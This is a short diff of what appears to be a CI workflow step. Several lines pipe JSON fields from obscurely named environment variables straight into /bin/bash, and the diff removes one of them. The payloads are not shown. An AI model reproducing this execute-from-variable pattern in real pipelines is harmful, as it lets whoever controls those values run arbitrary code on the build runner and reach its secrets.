@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$ynthu1" | jq -r .xu14 | /bin/bash
           echo $yiih9 | jq -r .oy25493 | /bin/bash
-          echo $s2069 | jq -r .rew89 | /bin/bash
           echo $foob66358 | jq -r .fhh6389 | /bin/bash
 
       - name: Persist output
